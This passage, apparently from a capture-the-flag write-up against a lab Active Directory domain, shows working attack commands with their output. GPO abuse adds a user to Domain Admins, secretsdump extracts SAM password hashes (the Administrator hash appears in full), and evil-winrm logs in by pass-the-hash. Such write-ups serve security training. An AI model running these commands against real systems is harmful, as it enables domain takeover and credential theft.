$ python pygpoabuse.py 'darkcorp.htb/TAYLOR.B.ADM:!QAZzaq1' -gpo-id '652cae9a-4bb7-49f2-9e52-3361f33ce786' -command 'net group "Domain Admins" taylor.b.admin /add /domain' -dc-ip 172.16.20.1 -f -v

INFO:root:Version updated
[*] Version updated
SUCCESS:root:ScheduledTask TASK_6fc934b7 created!
[+] ScheduledTask TASK_6fc934b7 created!

$ secretsdump.py darkcorp/taylor.b.adm:'!QAZzaq1'@dc-01.darkcorp.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe7c8f385f342172c7b0267fe4f3cbbd6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
```

Now we can grab the root flag.

```console
$ evil-winrm -i dc-01.darkcorp.htb -u Administrator -H 'fcb3ca5a19a1ccf2d14c13e8b64cde0f'
```